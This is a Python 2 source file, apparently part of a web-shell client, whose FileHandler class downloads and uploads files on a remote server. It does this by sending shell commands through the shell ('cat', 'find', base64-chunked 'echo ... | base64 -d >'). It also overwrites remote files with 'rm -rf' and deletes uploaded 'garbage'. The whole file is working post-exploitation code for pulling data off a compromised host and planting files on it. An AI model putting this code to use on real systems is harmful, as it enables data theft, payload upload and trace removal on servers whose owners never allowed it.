import os
from subprocess import Popen, PIPE

from core.libs.thirdparty.tqdm import tqdm

from core.libs.thirdparty.termcolor import cprint, colored
from core.libs.request_handler import make_request


class FileHandler(object):
    # A method for downloading files from the box
    def download_file(self, rfile_path, lfile_path):
        cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo file; else echo dir; fi; fi'.format(rfile_path)
        file_type = make_request.get_page_source(cmd)
        if file_type:
            file_type = file_type[0]

        if file_type == 'file':
            cmd = 'cat {0}'.format(rfile_path)
            try:
                with open(lfile_path, 'w') as dest_file:
                    dest_file.write('\n'.join(make_request.get_page_source(cmd)) + '\n')
                print '\n[+] Successfully downloaded "{0}" to "{1}"'.format(rfile_path, lfile_path)
            except IOError, e:
                cprint('\n[!] Error: {0}'.format(e), 'red')
        elif file_type == 'dir':
            cmd = 'find {0} | while read f;do echo $f;done'.format(rfile_path)
            files = make_request.get_page_source(cmd)
            for file in files:
                cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo file; else echo dir; fi; fi'.format(file)
                file_type = make_request.get_page_source(cmd)[0]
                if file_type == 'dir':
                    #folder = os.path.exists(os.path.join(lfile_path, file))  # Didn't like: @download /media/CD /root/
                    folder = lfile_path + file
                    if not os.path.exists(folder):
                        os.makedirs(folder)
                elif file_type == 'file':
                    cmd = 'cat {0}'.format(file)
                    try:
                        #with open(os.path.join(lfile_path, file), 'w') as dest_file:  # Didn't like: @download /media/CD /root/
                        with open(lfile_path + file, 'w') as dest_file:
                            dest_file.write('\n'.join(make_request.get_page_source(cmd)) + '\n')
                    except IOError, e:
                        cprint('\n[!] Error: {0}'.format(e), 'red')
                else:
                    print colored('[!] Coudln\'t download the following file:', 'red'), file
            print colored('\n[+] Downloaded successfully to:', 'green'), lfile_path
        else:
            cprint('\n[!]The file/directory doesn\'t exist or I don\'t have permission', 'red')

    # A method for uploading files to the box
    def upload_file(self, lfile_path, rfile_path):
        """
        Upload files to the remote server using base64 and chunks
        self.upload_file('local_file', 'remote_file')
        """
        def write_file(rfilr_path):
            "nested function to be used within the file_exists conditions"
            try:
                # open the the file in 'r' mode to upload it
                with open(lfile_path) as local_file:
                    data_to_upload = local_file.read().encode('base64').strip()
                    #split the data then join it to escap special chars and new lines
                    data_to_upload = ''.join(data_to_upload.splitlines())

                def chuncks(seq, length):
                    "split data into chuncks to avoid Error 414"
                    return [seq[i:i + length] for i in xrange(0, len(seq), length)]

                if len(data_to_upload) > 300 and make_request.method != 'post':
                    chuncked_data = chuncks(data_to_upload, 6000)
                    cprint('\n[!] The amount of data being uploaded is big, I will chunck it into %d stages.' % len(chuncked_data), 'red')
                    for i in tqdm(range(len(chuncked_data))):
                        # append data to pre-written file using >>
                        data = 'echo {0}| base64 -d >> {1}'.format(chuncked_data[i], rfile_path)
                        make_request.get_page_source(data)
                else:
                    data = 'echo {0}| base64 -d > {1}'.format(data_to_upload, rfile_path)
                    make_request.get_page_source(cmd=data)

                if self.check_fileSum(lfile_path, rfile_path):
                    "if the two files have the same md5sum"
                    print '[+] Successfully uploaded {0} to {1}'.format(lfile_path, rfile_path)
                else:
                    cprint('[!] Something went wrong while uploading the file')
            # throw an exception when the local file not exists
            except IOError:
                cprint('\n[+] File: "{0}" doesn\'t exist'.format(lfile_path), 'red')

        if self.file_exists(rfile_path):
            if rfile_path.split('/')[-1] == lfile_path:
                cprint('\n[!] File: {0} already exists on the server'.format(rfile_path), 'red')
                choice = raw_input('[+] Shall I overwrite the file (y/n): ')
                if choice.lower() == 'y':
                    make_request.get_page_source("rm -rf {0}".format(rfile_path))
                    write_file(rfile_path)  # call write_file function
                else:
                    """
                    >>> x = "/var/www/uploads/x.php"
                    >>> x.rsplit('/', 1)
                    ['/var/www/uploads', 'x.php']
                    >>>
                    """
                    rfile_path = rfile_path.rsplit('/', 1)[0] + '/' + raw_input("\n[+] Please, enter a unique file name: ")
                    # in case of the new file name also exists
                    while self.file_exists(rfile_path):
                        cprint('\n[!] File: {0} already exists on the server'.format(rfile_path), 'red')
                        rfile_path = rfile_path.rsplit('/', 1)[0] + '/' + raw_input("[+] Pick up another name: ")
                    write_file(rfile_path)  # call write_file function
            else:
                cprint('\n[!] Looks like you\'r trying to overwrite a directory')
                choice = raw_input("[+] Shall I overwrite {0} (y/n): ".format(rfile_path))
                if choice.lower() == 'y':
                    make_request.get_page_source("rm -rf {0}".format(rfile_path))
                    write_file(rfile_path)  # call write_file function
        else:
            write_file(rfile_path)  # call write_file function

    def file_exists(self, rfile):
        "check if the file we upload is already on the server or not !"
        cmd = 'if [ -e {0} ]; then echo "True"; fi;'.format(rfile)
        return make_request.get_page_source(cmd)

    def check_fileSum(self, lfile_path, rfile_path):
        lfileSum = Popen('md5sum {0}'.format(lfile_path), shell=True, stdout=PIPE, stderr=PIPE)
        rfileSum = "".join(make_request.get_page_source('md5sum ' + rfile_path)).split()[0]
        lfileSum = lfileSum.communicate()[0].split()[0]
        return lfileSum == rfileSum

    def clean(self, garbage):
        cmd = "rm -f {0}".format(garbage)
        cprint('\n[+] Cleaning The garbage, DONE!', 'yellow')
        make_request.get_page_source(cmd)

file_handler = FileHandler()
